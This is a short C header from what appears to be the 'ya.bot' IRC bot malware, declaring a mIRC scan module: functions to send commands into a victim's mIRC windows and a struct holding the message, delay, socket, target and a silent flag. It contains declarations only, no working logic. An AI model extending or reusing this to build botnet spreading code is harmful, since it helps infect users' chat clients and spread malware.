/*  ya.bot  */

#ifndef NO_MIRCSCAN
DWORD WINAPI mircscan_main(LPVOID param);
bool mircscan_sendcommand(char *pszCommand, ...);
bool CALLBACK mircscan_window(HWND hWnd, LPARAM param);

typedef struct SMircScan
{
	char m_szMessage[IRCBUF];
	int m_nDelay;
	DWORD m_dwTime;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SMircScan;
#endif